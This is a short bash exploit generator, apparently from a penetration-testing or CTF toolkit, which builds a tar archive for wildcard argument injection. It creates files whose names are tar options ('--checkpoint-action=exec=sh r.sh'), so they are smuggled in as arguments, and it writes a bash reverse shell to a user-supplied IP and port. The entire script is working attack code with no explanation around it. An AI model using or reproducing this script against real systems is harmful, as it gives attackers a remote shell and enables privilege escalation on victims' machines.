#!/bin/bash

if [ "${#@}" -lt 2 ]; then 
        echo "Usage: ./createTarExploit IP PORT"
        echo "Eg: ./crateTarExploit 10.10.10.10 9999"
        exit 1;

fi

echo "Creating tar shell"

TFILE="exp.tar"
if [ -f "$TFILE"  ]; then
 rm "$TFILE"
fi

 echo '' > --checkpoint=1
echo '' > "--checkpoint-action=exec=sh r.sh"
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/$1/$2 0>&1'" > r.sh
tar -cvf "$TFILE" ./--checkpoint=1 ./--checkpoint-action=exec=sh\ r.sh ./r.sh
sleep 2
rm ./--checkpoint-action=exec=sh\ r.sh
rm ./--checkpoint=1
rm r.sh

